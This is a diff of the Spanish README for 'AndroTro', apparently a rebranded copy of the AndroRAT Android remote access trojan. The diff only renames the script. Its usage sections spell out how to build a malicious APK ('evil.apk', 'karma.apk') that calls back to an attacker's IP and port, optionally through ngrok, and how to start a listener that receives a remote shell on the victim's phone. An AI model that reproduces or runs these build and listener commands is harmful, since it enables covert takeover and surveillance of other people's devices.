@@ -8,7 +8,7 @@ AndroTro es una herramienta diseñada para controlar el sistema Android de forma
 
 ##### AndroTRO funcionará en dispositivos desde Android 4.1 (Jelly Bean) hasta Android 9.0 (Oreo) (API 16 a API 28)
 
-> AndroTRO también funciona en Android 10 (Q), pero algunos de los comandos del intérprete serán inestables. 
+> AndroTro también funciona en Android 10 (Q), pero algunos de los comandos del intérprete serán inestables. 
 
 ## Screenshots
 
@@ -55,7 +55,7 @@ Debes ejecutar Git bash con privilegios de administrador.
 
 ```
 Uso:
-  python3 androTRO.py --build --ngrok [banderas]
+  python3 androTro.py --build --ngrok [banderas]
   Banderas:
     -p, --port Número de puerto del atacante (opcional, por defecto está configurado en 8000)
     -o, --output Nombre del archivo apk (opcional, por defecto está configurado en "karma.apk")
@@ -64,7 +64,7 @@ Uso:
 
 ```
 Uso:
-  python3 androTRO.py --build [banderas]
+  python3 androTro.py --build [banderas]
   Banderas:
     -i, --ip Dirección IP del atacante (obligatoria)
     -p, --port Número de puerto del atacante (obligatorio)
@@ -76,7 +76,7 @@ O puede compilar manualmente el apk importando la carpeta [Código de Android](A
 ### modo `shell`
 ```
 Uso:
-  python3 androTRO.py --shell [banderas]
+  python3 androTro.py --shell [banderas]
   Banderas:
     -i, --ip Dirección IP de Listner
     -p, --port Número de puerto de Listner
@@ -114,15 +114,15 @@ En el shell sh hay algunos subcomandos.
 
 * Para compilar el apk usando ngrok, que también configurará el listner:
 
-``python3 androRAT.py --build --ngrok -o evil.apk``
+``python3 androTro.py --build --ngrok -o evil.apk``
 
 * Para construir el apk usando la IP y el puerto deseados:
 
-``python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk``
+``python3 androTro.py --build -i 192.169.x.x -p 8000 -o evil.apk``
 
 * Para conseguir el intérprete:
 
-``python3 androRAT.py --shell -i 0.0.0.0 -p 8000``
+``python3 androTro.py --shell -i 0.0.0.0 -p 8000``
 
 ## Ejemplos de intérpretes
 
